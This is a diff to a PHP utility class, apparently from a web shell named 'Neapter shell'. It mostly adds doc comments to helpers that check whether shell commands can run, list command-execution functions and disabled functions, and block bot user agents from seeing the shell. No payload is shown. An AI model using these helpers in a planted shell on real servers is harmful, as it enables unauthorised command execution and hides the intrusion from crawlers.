@@ -104,6 +104,12 @@ class Utils
         return $this->encrypt($sData, $sKey);
     }
 
+    /**
+     * Get port number. If port is incorrect, 0 returns
+     *
+     * @param  integer $iPort Port number
+     * @return integer
+     */
     public function getPort($iPort)
     {
         if (!ctype_digit((string) $iPort)) {
@@ -119,6 +125,12 @@ class Utils
         return $iPort;
     }
 
+    /**
+     * Get hostname and port. If port is incorrect, function returns empty array
+     *
+     * @param string $sHost hostname:port
+     * @return array
+     */
     public function getHostPort($sHost)
     {
         $sHost = trim($sHost);
@@ -133,20 +145,34 @@ class Utils
             return array();
         }
 
-
         return array($sHost, $iPort);
     }
 
+    /**
+     * Neapter shell is running on Windows?
+     *
+     * @return bool
+     */
     public function isWindows()
     {
         return (strncmp(PHP_OS, 'WIN', 3) === 0);
     }
 
+    /**
+     * PHP safe_mode has been enabled?
+     *
+     * @return bool
+     */
     public function isSafeMode()
     {
         return (bool) ini_get('safe_mode');
     }
 
+    /**
+     * Is it possible to execute shell command?
+     *
+     * @return bool
+     */
     public function isExecutable()
     {
         if ($this->isSafeMode()) {
@@ -161,6 +187,11 @@ class Utils
         return (count($aDiff) > 0);
     }
 
+    /**
+     * Get array of all disabled functions
+     *
+     * @return array
+     */
     public function getDisabledFunctions()
     {
         $aDisableFunctions = array();
@@ -180,6 +211,11 @@ class Utils
         return $aDisableFunctions;
     }
 
+    /**
+     * Get list of PHP functions to execute shell command
+     *
+     * @return array
+     */
     public function getSystemFunctions()
     {
         $aSystemFunctions = array(
@@ -198,9 +234,15 @@ class Utils
         return $aSystemFunctions;
     }
 
+    /**
+     * Block all bots, spiders etc. Check if useragent is bot
+     *
+     * @param  string $sUserAgent Full User-Agent
+     * @return bool
+     */
     public function isUserAgentOnBlacklist($sUserAgent)
     {
-        static $aUserAgents = array(
+        $aUserAgents = array(
             'bot',
             'yahoo',
             'spider'
@@ -505,6 +547,6 @@ class Utils
     {
         $oShell = new ReflectionClass('Shell');
 
-        return $this->sFilename = $oShell->getFilename();
+        return $oShell->getFilename();
     }
 }
